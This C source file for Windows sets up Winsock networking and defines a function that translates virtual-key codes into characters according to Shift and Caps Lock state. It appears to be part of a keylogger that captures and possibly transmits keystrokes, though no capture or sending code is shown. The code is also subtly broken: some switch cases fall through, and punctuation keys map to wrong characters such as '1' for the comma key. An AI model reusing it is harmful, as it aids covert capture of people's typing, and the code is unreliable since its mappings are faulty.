#define _WIN32_WINNT 0x0600
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
#define CLOSESOCKET(s) closesocket(s)
#define GETSOCKETERRNO() (WSAGetLastError())


const int isCapsLock()
{
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

const int isAltgrLock()
{
    return (GetKeyState(VK_RMENU) < 0 && GetKeyState(VK_LCONTROL) < 0);
}

const int isShiftLock()
{
    return GetKeyState(VK_SHIFT) < 0;
}

#include <stdio.h>
#include <string.h>
#include <Windows.h>
char key[50];
char* translate_key(DWORD vkCode)
{

    memset(key, '\0', 50);

    if (vkCode > 64 && vkCode < 91)
    {
        if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock()))
            vkCode += 32;
        char key_char = (char)vkCode;
        sprintf(key, "%c", key_char);
    }
    else if (vkCode >= 48 && vkCode <= 57)
    {
        const char* number[] = {
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" };
        const char* number_shifted[] = {
            ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };

        if (isCapsLock() || isShiftLock())
            sprintf(key, "%s", number_shifted[vkCode - 48]);
        else
            sprintf(key, "%s", number[vkCode - 48]);
    }
    else if (vkCode >= VK_LBUTTON && vkCode <= 7)
        sprintf(key, "%s", "");
    else if (vkCode >= VK_NUMPAD0 && vkCode <= VK_DIVIDE)
    {
        const char *key1[] = {
        "0", "1", "2", "3", "4", "5",
        "6", "7", "8", "9", "*", "+",
        "-", "-", ".", "/" };
        sprintf(key, "%s", key1[vkCode - VK_NUMPAD0]);
    }
    else if (vkCode >= VK_F1 && vkCode <= VK_F24)
    {
        const char* key2[] = {
            "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]",
            "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]",
            "[F13]", "[F14]", "[F15]", "[F16]", "[F17]", "[F18]",
            "[F19]", "[F20]", "[F21]", "[F22]", "[F23]", "[F24]" };

        sprintf(key, "%s", key2[vkCode - VK_F1]);

    }
    else
    {
        switch (vkCode)
        {
        case VK_BACK:
            sprintf(key, "%s", "[BACK]");
            break;
        case VK_TAB:
            sprintf(key, "%s", "VK_TAB");
            break;
        case VK_SPACE:
            sprintf(key, "%s", " ");
            break;
        case VK_RIGHT:
            sprintf(key, "%s", "");
            break;
        case VK_LEFT:
            sprintf(key, "%s", "");
            break;
        case VK_UP:
            sprintf(key, "%s", "");
            break;
        case VK_DOWN:
            sprintf(key, "%s", "");
            break;
        case VK_RETURN:
            sprintf(key, "%s", "\n");
            break;
        case 0xBB:
            if (isCapsLock() ^ isShiftLock())
                sprintf(key, "%s", "+");
            else
                sprintf(key, "%s", "=");
            break;
        case 0xBD:
            if (isCapsLock() ^ isShiftLock())
                sprintf(key, "%s", "_");
            else
                sprintf(key, "%s", "-");
            break;
        case 0xDB:
            if (isCapsLock() ^ isShiftLock())
                sprintf(key, "%s", "{");
            else
                sprintf(key, "%s", "[");
            break;
        case 0xDD:
            if (isCapsLock() ^ isShiftLock())
                sprintf(key, "%s", "}");
            else
                sprintf(key, "%s", "]");
            break;
        case 0xBA:
            if (isCapsLock() ^ isShiftLock())
                sprintf(key, "%s", ":");
            else
                sprintf(key, "%s", ";");
            break;
        case 0xDE:
            sprintf(key, "%s", "'");
            break;
        case 0xBC:
            if (isCapsLock() ^ isShiftLock())
                sprintf(key, "%s", "1");
            else
                sprintf(key, "%s", "2");
        case 0xBE:
            if (isCapsLock() ^ isShiftLock())
                sprintf(key, "%s", "3");
            else
                sprintf(key, "%s", "4");
        case 0xBF:
            if (isCapsLock() ^ isShiftLock())
                sprintf(key, "%s", "<");
            else
                sprintf(key, "%s", ",");
            break;
        default:
        {
            sprintf(key, "%s", "");
        }
        }
    }
    return key;
}